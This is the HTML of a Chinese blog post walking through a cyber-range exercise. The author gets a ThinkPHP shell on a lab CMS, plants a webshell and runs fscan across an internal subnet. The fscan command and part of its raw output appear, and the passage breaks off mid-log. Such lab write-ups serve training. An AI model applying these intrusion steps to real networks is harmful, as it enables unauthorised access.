@@ -1,0 +1,868 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tuyi.jpg">
+  <link rel="icon" href="/img/tuyi.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="tuyi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="开干题目：本次小李的任务是攻克192.168.10.0&#x2F;24网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象的复杂。 挂上openvpn，修改特定流量走vpn 12route-nopull route 192.168.10.0 255.255.255.0 vpn_gateway  进去是一个CMS，没啥信息   无影信息搜集一波  EyouCMSv1.0.9 后台登录 htt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cyberstrikelab_lab1">
+<meta property="og:url" content="https://tuyiisxp.github.io/2025/03/30/cyberstrikelab-lab1/">
+<meta property="og:site_name" content="tuyi的小站">
+<meta property="og:description" content="开干题目：本次小李的任务是攻克192.168.10.0&#x2F;24网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象的复杂。 挂上openvpn，修改特定流量走vpn 12route-nopull route 192.168.10.0 255.255.255.0 vpn_gateway  进去是一个CMS，没啥信息   无影信息搜集一波  EyouCMSv1.0.9 后台登录 htt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330130911534.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160544119.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160825664.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161123484.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160245446.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161706080.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161820531.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162308966.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162432322.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162556257.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330165023160.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330210000076.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330235956036.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331091159567.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093101546.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093236516.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093336037.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403102526421.png">
+<meta property="article:published_time" content="2025-03-30T05:06:42.000Z">
+<meta property="article:modified_time" content="2025-04-03T05:29:08.504Z">
+<meta property="article:author" content="tuyi">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330130911534.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>cyberstrikelab_lab1 - tuyi的小站</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/reward.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tuyiisxp.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>tuyi的小站</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="cyberstrikelab_lab1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-30 13:06" pubdate>
+          2025年3月30日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">cyberstrikelab_lab1</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年4月3日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h1><p><strong>题目</strong>：本次小李的任务是攻克192.168.10.0&#x2F;24网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象的复杂。</p>
+<p>挂上openvpn，修改特定流量走vpn</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span>-nopull <br><span class="hljs-attribute">route</span> <span class="hljs-number">192.168.10.0</span> <span class="hljs-number">255.255.255.0</span> vpn_gateway<br></code></pre></td></tr></table></figure>
+
+<p>进去是一个CMS，没啥信息</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330130911534.png" srcset="/img/loading.gif" lazyload alt="image-20250330130911534"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160544119.png" srcset="/img/loading.gif" lazyload alt="image-20250330160544119"></p>
+<p>无影信息搜集一波</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160825664.png" srcset="/img/loading.gif" lazyload alt="image-20250330160825664"></p>
+<p>EyouCMSv1.0.9</p>
+<p>后台登录 <code>http://192.168.10.10/index.php/admin/Admin/login</code></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161123484.png" srcset="/img/loading.gif" lazyload alt="image-20250330161123484"></p>
+<p>但是啥也没有，弱口令没有</p>
+<p>上fscan扫描</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330160245446.png" srcset="/img/loading.gif" lazyload alt="image-20250330160245446"></p>
+<p>thinkphp一把搜哈</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161706080.png" srcset="/img/loading.gif" lazyload alt="image-20250330161706080"></p>
+<p>直接getshell</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330161820531.png" srcset="/img/loading.gif" lazyload alt="image-20250330161820531"></p>
+<p>上传webshell</p>
+<p>连马flag1</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162308966.png" srcset="/img/loading.gif" lazyload alt="image-20250330162308966"></p>
+<p>进入内网渗透状态，🤡🤡🤡🤓</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162432322.png" srcset="/img/loading.gif" lazyload alt="image-20250330162432322"></p>
+<p>权限是system，是win server2012</p>
+<p>看下网络</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330162556257.png" srcset="/img/loading.gif" lazyload alt="image-20250330162556257"></p>
+<p>两个网段，直接传fscan上传靶机</p>
+<p>上传<code>fscan.exe</code></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330165023160.png" srcset="/img/loading.gif" lazyload alt="image-20250330165023160"></p>
+<p>运行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.20.10</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:alive</span> 详情<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:alive</span> 详情<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span>] [<span class="hljs-variable constant_">HOST</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:alive</span> 详情<span class="hljs-symbol">:protocol=ICMP</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">88</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">80</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">389</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">3306</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">3306</span>, service=mysql, product=<span class="hljs-title class_">My</span>SQL, info=unauthorized, banner=H.j <span class="hljs-title class_">Host</span> <span class="hljs-string">&#x27;WIN-KOHRC1DGOL9&#x27;</span> is <span class="hljs-keyword">not</span> allowed to connect to this <span class="hljs-title class_">My</span>SQL server<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">16</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">88</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">80</span>, service=http<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">139</span>, service=unknown, banner=.<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">23</span>] [<span class="hljs-variable constant_">PORT</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:open</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">8888</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">389</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">8888</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:service=unknown</span>, port=<span class="hljs-number">135</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span 